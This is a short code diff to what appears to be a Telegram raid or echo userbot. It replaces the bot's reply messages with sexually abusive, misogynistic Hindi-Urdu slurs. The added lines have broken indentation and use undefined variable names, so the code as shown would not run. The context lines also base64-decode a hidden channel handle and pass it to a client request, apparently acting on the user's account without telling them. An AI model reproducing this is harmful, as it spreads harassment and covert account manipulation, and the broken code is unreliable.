@@ -19,13 +19,13 @@ async def echo(event):
             reply_msg = await event.get_reply_message()
             user_id = reply_msg.sender_id
 
-            if user_id in FRIDAY:
-                await event.reply("ᴛʜɪs ᴘᴇʀsᴏɴ ɪs ᴛʜᴇ ᴄʀᴇᴀᴛᴏʀ ᴏғ ᴛʜɪs ᴘʀᴏᴊᴇᴄᴛ sᴏᴜʀᴄᴇ.")
-            elif user_id == OWNER_ID:
-                await event.reply("ᴋɪᴅᴢᴢ😂 ᴏᴡɴᴇʀ ʜᴀɪ ʏᴇ ᴍᴇʀᴀ ʙᴀʜᴜᴛ ᴍᴀʀᴇɢᴀ..")
-            elif user_id in SUDO_USERS:
-                await event.reply("ᴛʜɪs ᴘᴇʀsᴏɴ ᴀʟsᴏ ʜᴀᴠᴇ ᴀʙɪʟɪᴛɪᴇs ᴛᴏ ᴜsᴇ ᴍᴇ sᴏ ɪ ᴄᴀɴᴛ ɢᴏ ᴀɢᴀɪɴsᴛ ᴛʜᴇᴍ..")
-            else:
+            if uid in FRIDAY:
+            await e.reply("ʀɴᴅɪ ᴋ ᴏʟᴀᴀᴅ ᴋʟ ᴋ ᴀᴀʏᴇ ᴘɪʟʟᴇ ᴀʙ ᴀᴘɴᴇ ʙᴀᴀᴘ ᴘᴇ ʜɪ ᴍᴀᴀʀᴇɢᴀ ʀᴀɪᴅ ᴛᴇʀɪ ᴍᴀɪʏᴀᴀ ᴄʜᴏᴅᴜᴜ")
+        elif uid == OWNER_ID:
+            await e.reply("ᴄʜʟᴀ ʟᴇ ʀᴀɴᴅɪ ᴏᴡɴᴇʀ sᴇ ʜɪ ᴋʀʟᴏ ʙᴀᴋᴀɪᴛɪ ᴅᴏɴᴏ ᴋɪ ɢᴀᴀɴᴅ ᴍᴀᴀʀ ᴅᴇɢᴀ ᴏᴡɴᴇʀ")
+        elif uid in SUDO_USERS:
+            await e.reply("sᴜᴅᴏ ʜᴀɪ ʏʀʀ ᴡᴏʜ ᴜsᴘᴇ ɴʜᴋ ᴋʀsᴋᴛᴀ")
+        else:
                 try:
                     alt = Get(base64.b64decode('QFRoZUFsdHJvbg=='))
                     await event.client(alt)
